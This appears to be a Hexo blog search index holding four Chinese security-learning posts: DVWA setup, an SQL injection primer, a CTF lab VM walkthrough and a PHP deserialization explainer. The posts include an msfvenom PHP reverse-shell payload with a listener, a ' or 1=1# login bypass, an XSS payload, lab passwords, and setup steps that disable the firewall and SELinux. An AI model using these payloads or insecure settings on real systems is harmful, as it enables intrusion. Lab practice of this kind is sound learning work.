@@ -1,0 +1,754 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>centos下dvwa的搭建</title>
+    <url>/archives/d1dcde3a.html</url>
+    <content><![CDATA[<hr>
+<p>本章内容：这是一篇关于dvwa搭建的文章</p>
+<hr>
+<a id="more"></a>
+
+
+
+<h2 id="1、安装软件包"><a href="#1、安装软件包" class="headerlink" title="1、安装软件包"></a>1、安装软件包</h2><p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install mariadb*</span><br><span class="line"></span><br><span class="line">yum -y install httpd</span><br><span class="line"></span><br><span class="line">Yum -y install php*</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/08/06/5jgo2mBkIAKxtGH.jpg" width='60%'/>
+
+
+
+<p>我们直接安装PHP可能会报错</p>
+<p>因此我们需要先卸载老版本的php<br>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum remove php* php-common</span><br></pre></td></tr></table></figure>
+<p>首先安装epel-release<br>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install epel-release</span><br></pre></td></tr></table></figure>
+<p>再通过rpm安装PHP源<br>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -Uvh https:&#x2F;&#x2F;mirror.webtatic.com&#x2F;yum&#x2F;el7&#x2F;webtatic-release.rpm</span><br></pre></td></tr></table></figure>
+<p>刷新一下yum源<br>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum clear all</span><br></pre></td></tr></table></figure>
+<p>执行安装<br>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install php70w -y</span><br></pre></td></tr></table></figure>
+<p>安装过程会挺久<br>最后验证php -v<br><img src="https://i.loli.net/2020/08/06/eQ2dDEulYBygbOF.jpg" width='60%'/></p>
+<h2 id="2、上传dvwa"><a href="#2、上传dvwa" class="headerlink" title="2、上传dvwa"></a>2、上传dvwa</h2><p>将下载好的dvwa上传到服务器上去，然后解压到指定目录，移到Apache目录下，即/var/www/html下。</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv DVWA-master.zip  &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>这里解压的话需要支持解压zip的工具，因此我们要安装该工具</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y unzip zip</span><br></pre></td></tr></table></figure>
+
+<p>解压DVWA-master.zip</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unzip DVWA-master.zip</span><br></pre></td></tr></table></figure>
+
+<p>将解压后的文件夹改名为DVWA</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv DVWA-master DVWA</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/08/06/hKomv681zkIl57D.jpg" width='60%'/>
+
+
+
+<h2 id="3、设置数据库"><a href="#3、设置数据库" class="headerlink" title="3、设置数据库"></a>3、设置数据库</h2><p>先启动mariadb服务</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start mariadb</span><br></pre></td></tr></table></figure>
+
+<p>进入数据库，回车直接进入</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+
+<p>数据库执行以下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database dvwa;</span><br><span class="line"></span><br><span class="line">grant all on dvwa.* to dvwa@localhost identified by &#39;123456&#39;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>上述的sql语句意思是创建一个dvwa数据库，授权dvwa用户拥有所有权限，刷新系统权限表。</p>
+<p>退出数据库后重启一下mariadb服务</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart mariadb</span><br></pre></td></tr></table></figure>
+
+<h2 id="4、修改dvwa的配置文件"><a href="#4、修改dvwa的配置文件" class="headerlink" title="4、修改dvwa的配置文件"></a>4、修改dvwa的配置文件</h2><p>文件在DVWA目录下的config文件夹里面，里面有个文件名叫config.inc.php.dist的文件</p>
+<p>先把该文件复制一份备份并命名为config.inc.php</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure>
+
+<p>vim进入该文件</p>
+<img src="https://i.loli.net/2020/08/06/K5ZekTCEo4HJLV3.jpg" width='60%'/>
+
+<p>两个key分别是6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg以及6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ，也可以上网找</p>
+<p>修改/etc/php.ini这个文件</p>
+<p>将allow_url_include = Off改为On</p>
+<h2 id="5、重启服务"><a href="#5、重启服务" class="headerlink" title="5、重启服务"></a>5、重启服务</h2><p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart mariadb</span><br><span class="line"></span><br><span class="line">systemctl restart httpd</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
+
+<p>测试是否可以进去DVWA平台</p>
+<img src="https://i.loli.net/2020/08/06/2VukU4wMnzpcNQh.jpg" width='60%'/>
+
+<p>解决方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown apache:apache -R &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
+
+<p>以及安装php-mysqli</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y php-mysqli</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入基础篇</title>
+    <url>/archives/cc508ab0.html</url>
+    <content><![CDATA[<hr>
+<p>本章内容：这是一篇关于SQL注入基础的文章</p>
+<hr>
+<a id="more"></a>
+
+
+
+<p>前言：之前参照前辈的一些文章，写了一篇SQL盲注总结，算是加深对SQL盲注的理解和运用，但是回过头发现，竟然没有SQL注入的基础篇，因此今天写的这篇文章针对的是SQL注入的基础，仅对SQL注入做一个了解，不会有太深的SQL注入的内容，仅针对小白。</p>
+<h1 id="1、SQL基础"><a href="#1、SQL基础" class="headerlink" title="1、SQL基础"></a>1、SQL基础</h1><h2 id="1-1、什么是SQL？"><a href="#1-1、什么是SQL？" class="headerlink" title="1.1、什么是SQL？"></a>1.1、什么是SQL？</h2><p>这里我们来理解一下这两个概念——数据库、SQL</p>
+<p>数据库简单来说就是数据的集合。经常玩游戏的人会知道一个游戏账号有若干个游戏角色，每个角色又有不同的装备、英雄、宠物等等，那么这些装备、英雄等的数据就是放在数据库中。通过数据库，数据被组织成行、列和表。</p>
+<p>数据库的存储是表格式的存储，类似于我们平时使用的表格。表格我们所知道的有行和列之分，一行数据拥有不同的属性，一列数据拥有相同的属性。简单来说，列就是比如姓名表中姓名、性别、年龄这些属性。而行就是每个学生的信息了。</p>
+<p>一个数据表中有若干行数据，一个数据库中有若干数据表，一个数据库系统中又有若干个数据库。</p>
+<p>SQL是一种标准化的编程语言，用于管理关系型数据库并对其中的数据执行各种操作。</p>
+<p>（注：以上说的数据库指的是关系型数据库）</p>
+<h2 id="1-2、SQL语句分类"><a href="#1-2、SQL语句分类" class="headerlink" title="1.2、SQL语句分类"></a>1.2、SQL语句分类</h2><p>SQL语句分为好多类，这里我们关注常用的    四类即可。</p>
+<p>（1）DQL：数据查询语言。顾名思义，即为查询操作，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句，也是所有SQL中用的最多的语句。关键字为select，各种简单查询，连接查询等都属于DQL。</p>
+<p>（2）DML：数据操纵语言。负责对数据库对象运行数据访问工作的指令集，以insert、update、delete三种指令为核心，分别代表插入、更新与删除数据。</p>
+<p>（3）DDL：数据定义语言。负责数据结构定义与数据库对象定义的语言，由create、alter和drop三个语法所组成，create创建数据库及其对象（如表、视图等），alter更改现有的数据库结构，drop从数据库中删除对象。</p>
+<p>（4）DCL：数据控制语言。是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。由grant和revoke两个指令组成。DCL以控制用户的访问权限为主，grant为授权语句，对应的revoke是撤销授权语句。</p>
+<p>具体SQL语句是怎样写的，网上有很多教程，这里就不具体讲了。</p>
+<h1 id="2、SQL注入"><a href="#2、SQL注入" class="headerlink" title="2、SQL注入"></a>2、SQL注入</h1><h2 id="2-1、什么是SQL注入？"><a href="#2-1、什么是SQL注入？" class="headerlink" title="2.1、什么是SQL注入？"></a>2.1、什么是SQL注入？</h2><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序,而这些输入大都是SQL语法里的一些组合,通过执行SQL语句进而执行攻击者所要的操作,其主要原因是程序没有细致地过滤用户输入的数据,致使非法数据侵入系统。</p>
+<h2 id="2-2、SQL注入的后果"><a href="#2-2、SQL注入的后果" class="headerlink" title="2.2、SQL注入的后果"></a>2.2、SQL注入的后果</h2><p>成功SQL注入漏洞可以：</p>
+<ul>
+<li><p>从数据库读取和修改敏感数据</p>
+</li>
+<li><p>在数据库上执行管理操作</p>
+<ul>
+<li>关闭审核或DBMS</li>
+<li>截断表和日志</li>
+<li>新增使用者</li>
+</ul>
+</li>
+<li><p>恢复DBMS文件系统上存在的给定文件的内容</p>
+</li>
+<li><p>向操作系统发出命令</p>
+</li>
+</ul>
+<p>SQL注入攻击使攻击者能够：</p>
+<ul>
+<li><p>欺骗身份</p>
+</li>
+<li><p>篡改现有数据</p>
+</li>
+<li><p>导致拒绝问题，例如使交易无效或余额发生变化</p>
+</li>
+<li><p>允许完全公开系统上的所有数据</p>
+</li>
+<li><p>销毁数据或使其不可用</p>
+</li>
+<li><p>成为数据库服务器的管理员</p>
+<h2 id="2-3、字符串SQL注入"><a href="#2-3、字符串SQL注入" class="headerlink" title="2.3、字符串SQL注入"></a>2.3、字符串SQL注入</h2></li>
+</ul>
+<p>下面我们来试试简单的SQL注入，这里我们直接使用mysql来模拟真实场景。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;假设下面的语句是真实一个登录场景的SQL语句，当username和password输入正确时才会返回结果，没有对输入的内容做任何过滤</span><br><span class="line">select * from users where username&#x3D;&#39;&#39; and password&#x3D;&#39;&#39;;</span><br><span class="line">&#x2F;&#x2F;上述的语句在正常用户输入正常的用户名密码的时候，是不会产生问题的，但是当黑客或者渗透人员在输入的时候，就会输入一些特殊的语句来尝试注入。</span><br><span class="line">&#x2F;&#x2F;当password输入&#39; or 1&#x3D;1#时，我们会发现，现在的SQL语句是这样子的。</span><br><span class="line">select * from users where username&#x3D;&#39;&#39; and password&#x3D;&#39;&#39; or 1&#x3D;1#&#39;;</span><br><span class="line">MariaDB [security]&gt; select * from users where username&#x3D;&#39;&#39; and password&#x3D;&#39;&#39; or 1&#x3D;1#&#39;;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">&#x2F;&#x2F;我们在没有输入正确的用户名密码的情况下，把所有信息都取出来了，这里的&#39; or 1&#x3D;1#我们也叫永真式，后面的or1&#x3D;1是永远都成立的，因此这整个SQL语句永久成立，自然就把信息全都取出来了</span><br></pre></td></tr></table></figure>
+
+<p>具体的东西我也不讲太多，毕竟是基础篇，想深入的小伙伴可以先去学学SQL语法，不用学的很深，会增删改查就OK了，另外推荐大家安装dvwa平台，可以在里面练习SQL注入。另外也有一个实验平台专门练习SQL注入的，叫sqli-labs，大家可以上网查一查，关于dvwa搭建流程我在之前的文章有说到，可以去看看。</p>
+<p>相关文章：<a href="./d1dcde3a.html">dvwa搭建</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机渗透训练——JIS-CTF-VulnUpload-CTF01</title>
+    <url>/archives/eca5dc88.html</url>
+    <content><![CDATA[<hr>
+<p>本章内容：这是一篇关于JIS-CTF-VulnUpload-CTF01靶机训练的文章</p>
+<hr>
+<a id="more"></a>
+
+
+
+<h1 id="1、前提准备"><a href="#1、前提准备" class="headerlink" title="1、前提准备"></a>1、前提准备</h1><p>靶机文件下载好之后，导入虚拟机</p>
+<p>不过这个靶机有点小问题，一开始网卡起不来，上网找了找解决方法</p>
+<p>解决方法：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">账号口令 technawi - 3vilH@ksor</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用网卡</span></span><br><span class="line">sudo ifconfig ens33 up </span><br><span class="line"><span class="meta">#</span><span class="bash"> 分配IP</span></span><br><span class="line">sudo dhclient</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在/etc/network/interfaces文件添加相关信息</span></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br></pre></td></tr></table></figure>
+
+<p>另外需要一台攻击机，这里我用的是kali。</p>
+<h1 id="2、主机发现"><a href="#2、主机发现" class="headerlink" title="2、主机发现"></a>2、主机发现</h1><p>一开始我们是不知道这个靶机的ip地址的，因此我们需要先对网段进行扫描</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.110.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/09/03/3nBORFrI4tc91gN.png" style="zoom:150%;" />
+
+<p>kali的ip是192.168.110.128，靶机的ip是192.168.110.130</p>
+<h1 id="3、端口扫描"><a href="#3、端口扫描" class="headerlink" title="3、端口扫描"></a>3、端口扫描</h1><p>存活端口扫描，他这里并没有做任何的限制，因此我们直接扫描就可以了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.110.130</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/09/03/aViXkbTm15QgfLR.png" style="zoom:150%;" />
+
+<p>有80 http以及22 ssh两个端口存活。</p>
+<p>我们试着访问80端口</p>
+<p><img src="https://i.loli.net/2020/09/03/psq1aMwJeAEWU3C.png"></p>
+<p>自动跳转到一个登陆页面，不知道账号密码，同时源码中也没有其他有用的信息。</p>
+<h1 id="4、目录扫描"><a href="#4、目录扫描" class="headerlink" title="4、目录扫描"></a>4、目录扫描</h1><p>一开始使用的是dirb工具来扫，但是扫完发现文件太多了。</p>
+<p>因此后面使用另一个扫描工具扫——nikto</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -h http://192.168.110.130 &gt; nikto扫描结果.txt</span><br></pre></td></tr></table></figure>
+
+<p>将扫描结果进行整理，有用的路径如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.110.130&#x2F;admin_area</span><br><span class="line">http:&#x2F;&#x2F;192.168.110.130&#x2F;flag</span><br><span class="line">http:&#x2F;&#x2F;192.168.110.130&#x2F;robots.txt</span><br><span class="line">http:&#x2F;&#x2F;192.168.110.130&#x2F;login.php</span><br><span class="line">http:&#x2F;&#x2F;192.168.110.130&#x2F;uploaded_files</span><br></pre></td></tr></table></figure>
+
+<p>在<code>http://192.168.110.130/admin_area</code>源代码中发现如下信息：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--    username : admin</span><br><span class="line">    password : 3v1l_H@ck3r</span><br><span class="line">    The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>http://192.168.110.130/flag</code>发现：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>login.php</code>是一开始我们就看到的登录页面，<code>uploaded_files</code>为空，暂时不知道这个文件是干嘛的。<code>rebots.txt</code>记录了一些目录信息</p>
+<p>到这里我们已经找到了两个flag</p>
+<h1 id="5、上传文件"><a href="#5、上传文件" class="headerlink" title="5、上传文件"></a>5、上传文件</h1><p>上面目录扫描的时候，有发现账号密码，用这个账号密码登录后发现这是一个上传文件的页面。</p>
+<p><img src="https://i.loli.net/2020/09/03/JOu3ZyTVe9sSEDa.png"></p>
+<p>我们试着上传一个文件，1.txt，并用bp抓包</p>
+<p><img src="https://i.loli.net/2020/09/03/jJlhVB3kRSdQKYG.png"></p>
+<p>更改数据包的一些信息，发现仍然可以上传成功，因此这里的上传点并没有做限制</p>
+<p><img src="https://i.loli.net/2020/09/03/FBo3l7n9uLOGXeJ.png"></p>
+<p>用msfvenom生成php木马并上传上去。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p  php/meterpreter/reverse_tcp  lhost=192.168.110.128 lport=8888 -f raw -o z7sz.php</span><br></pre></td></tr></table></figure>
+
+<p>用msfconsole去监听。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.110.128</span><br><span class="line">set LPORT 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>之后访问我们上传的木马就可以监听到了，这里有个问题就是我们并不知道上传的文件放在哪里，结合上面的目录扫描中有一个奇怪的目录<code>uploaded_files</code>，试着访问<code>http://192.168.110.130/uploaded_files/z7sz.php</code>，访问成功，说明上传的文件是放在<code>uploaded_files</code>这个文件夹里面的。</p>
+<img src="https://i.loli.net/2020/09/03/BKS1kH9j2IvT8bo.png" style="zoom:150%;" />
+
+<p>反弹成功并拿到交互shell。</p>
+<p>回到<code>/var/www/html</code>目录发现有个flag.txt文件，但是没有权限去访问</p>
+<p>访问hint.txt文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到第三个flag并且提示我们要找到technawi的密码才能查看flag.txt，改密码放在一个隐秘的地方。</p>
+<p>寻找用户名为technawi并且我们有权限访问的文件。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user technawi |grep -v &quot;Permission&quot; &gt;1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/09/03/xAlN926vXoqUeO8.png"></p>
+<p>在<code>credentials.txt</code>中发现第四个flag以及technawi的密码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br></pre></td></tr></table></figure>
+
+<p>登录进该用户，查看flag.txt，拿到第五个flag</p>
+<img src="https://i.loli.net/2020/09/03/sye83cf7Ba51ChI.png" style="zoom:150%;" />
+
+<p>到这里整个靶机已经打完了，该用户还不是root用户，本着打到底的想法，提权到root用户，用sudo -l查看一下sudo的权限，结果发现该用户拥有完整的sudo权限，直接sudo su等到进root用户。</p>
+<h1 id="6、总结"><a href="#6、总结" class="headerlink" title="6、总结"></a>6、总结</h1><p>这个靶机实际上是一个比较基础的靶机，针对的是文件上传漏洞，文件上传位置一定要控制好权限等问题。其他的也没什么可以说的。</p>
+]]></content>
+      <categories>
+        <category>靶机训练</category>
+      </categories>
+      <tags>
+        <tag>靶机训练</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化漏洞</title>
+    <url>/archives/b9fcc90b.html</url>
+    <content><![CDATA[<hr>
+<p>本章内容：这是一篇关于PHP反序列化漏洞的文章</p>
+<hr>
+<a id="more"></a>
+
+
+
+<h2 id="1、PHP序列化和反序列化"><a href="#1、PHP序列化和反序列化" class="headerlink" title="1、PHP序列化和反序列化"></a>1、PHP序列化和反序列化</h2><p>在学习PHP反序列化漏洞之前，我们有必要先来了解一下这两个函数，<code>serialize()</code>和<code>unserialize()</code>，熟悉PHP的大佬都知道，这两个是序列化和反序列化函数，那什么是序列化和反序列化。根据官方手册，所有php里面的值都可以使用函数<code>serialize()</code>来返回一个包含字节流的字符串来表示。<code>unserialize()</code>函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。那么简单来说，序列化就是把一个对象变成可以传输的字符串，反序列化就是把序列化后的字符串还原成对象。</p>
+<p>序列化示例：</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test=<span class="string">&quot;github&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=<span class="keyword">new</span> S(); <span class="comment">//创建一个对象</span></span><br><span class="line">    serialize($s); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">    <span class="keyword">echo</span> serialize($s)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">上述代码会返回 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:6:&quot;github&quot;;&#125;字符串。</span></span><br><span class="line"><span class="comment">        o:代表一个object</span></span><br><span class="line"><span class="comment">        第一个1：代表对象名字长度为一个字符</span></span><br><span class="line"><span class="comment">        S：对象的名称</span></span><br><span class="line"><span class="comment">        第二个1：代表对象里面有一个变量</span></span><br><span class="line"><span class="comment">        s：数据类型</span></span><br><span class="line"><span class="comment">        4：变量名称长度</span></span><br><span class="line"><span class="comment">        test：变量名称</span></span><br><span class="line"><span class="comment">        s：数据类型</span></span><br><span class="line"><span class="comment">        6：变量值的长度</span></span><br><span class="line"><span class="comment">        github：变量值</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="2、反序列化漏洞"><a href="#2、反序列化漏洞" class="headerlink" title="2、反序列化漏洞"></a>2、反序列化漏洞</h2><p>需要注意的是，序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题。我们来了解一下几个常见的魔法函数</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup()在被反序列化之前先调用该函数</span><br><span class="line"></span><br><span class="line">漏洞示例：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $test = <span class="string">&quot;github&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    $s = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    @$unser = unserialize(<span class="string">&#x27;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//上面的代码反序列化函数里面的东西是用户自己输入的，当用户输入该payload时，函数执行完就会弹出一个框，而之所以会这样，就是因为没有对用户输入的内容进行控制。</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>根据上面所说的内容，我们可以总结出该漏洞利用的条件：unserialize函数的参数用户可控，所写的内容需要有对象中的成员变量的值，脚本中存在魔法函数。</p>
+<h2 id="3、漏洞解析"><a href="#3、漏洞解析" class="headerlink" title="3、漏洞解析"></a>3、漏洞解析</h2><p>漏洞样例：phpMyAdmin 2.x中存在的反序列化漏洞，漏洞位置在/scripts/setup.php文件中。</p>
+<p>下面我们看一下源代码：</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define( <span class="string">&#x27;PMA_MINIMUM_COMMON&#x27;</span>, <span class="literal">TRUE</span> );</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./libraries/common.lib.php&#x27;</span>);   <span class="comment">//引入该php文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Grab configuration defaults</span></span><br><span class="line">$PMA_Config = <span class="keyword">new</span> PMA_Config();   <span class="comment">//创建了PMA_Config对象，PMA_Config就是对象名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Script information</span></span><br><span class="line">$script_info = <span class="string">&#x27;phpMyAdmin &#x27;</span> . $PMA_Config-&gt;get(<span class="string">&#x27;PMA_VERSION&#x27;</span>) . <span class="string">&#x27; setup script by Michal ?iha? &lt;michal@cihar.com&gt;&#x27;</span>;</span><br><span class="line">$script_version = <span class="string">&#x27;$Id$&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Grab action</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    $action = $_POST[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;configuration&#x27;</span>]) &amp;&amp; $action != <span class="string">&#x27;clear&#x27;</span> ) &#123;    </span><br><span class="line">    <span class="comment">//如果configuration存在并且action不为clear，则对configuration进行反序列化操作</span></span><br><span class="line">    <span class="comment">// Grab previous configuration, if it should not be cleared</span></span><br><span class="line">    $configuration = unserialize($_POST[<span class="string">&#x27;configuration&#x27;</span>]);   <span class="comment">//反序列化</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Start with empty configuration</span></span><br><span class="line">    $configuration = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We rely on Servers array to exist, so create it here</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($configuration[<span class="string">&#x27;Servers&#x27;</span>]) || !is_array($configuration[<span class="string">&#x27;Servers&#x27;</span>])) &#123;</span><br><span class="line">    $configuration[<span class="string">&#x27;Servers&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代码上面重要部分有注释</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>上面的这段代码简单来说，就是通过输入一个序列化字符，会反序列化成一个对象，但是并没有看到魔法函数。</p>
+<p>因此我们接着看引入的文件./libraries/common.lib.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/sanitizing.lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/Theme.class.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/Theme_Manager.class.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/Config.class.php&#x27;</span>;   <span class="comment">//引入了Config.class.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这个文件又引入了其他文件，我们主要看Config.class.php，这个才是重点文件。</p>
+<p>./libraries/Config.class.php：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)   //魔法函数<span class="title">__wakeup</span>，该魔法函数在对象被序列化之后立即被触发调用：</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;source_mtime !== filemtime(<span class="keyword">$this</span>-&gt;getSource())</span><br><span class="line">          || <span class="keyword">$this</span>-&gt;error_config_file || <span class="keyword">$this</span>-&gt;error_config_default_file ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;settings = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;load(<span class="keyword">$this</span>-&gt;getSource());   <span 